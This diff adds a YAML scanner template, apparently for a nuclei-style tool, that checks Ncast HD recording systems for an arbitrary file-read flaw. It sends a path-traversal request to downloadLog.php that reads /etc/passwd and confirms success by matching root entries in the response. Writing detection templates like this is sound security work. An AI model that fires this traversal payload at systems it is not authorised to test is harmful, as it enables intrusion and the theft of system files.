@@ -1,0 +1,24 @@
+id: ncast-lfi
+name: Ncast HD Intelligent Recording - Arbitrary File Reading
+severity: high
+confidence: confirmed
+description: Ncast HD intelligent recording and broadcasting system has an arbitrary file reading vulnerability.
+reference: https://github.com/wy876/POC/blob/main/Ncast%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+tags:
+- ncast
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /developLog/downloadLog.php?name=../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: body
+    words:
+    - application/force-download
+  - type: status
+    status:
+    - 200
+  condition: and
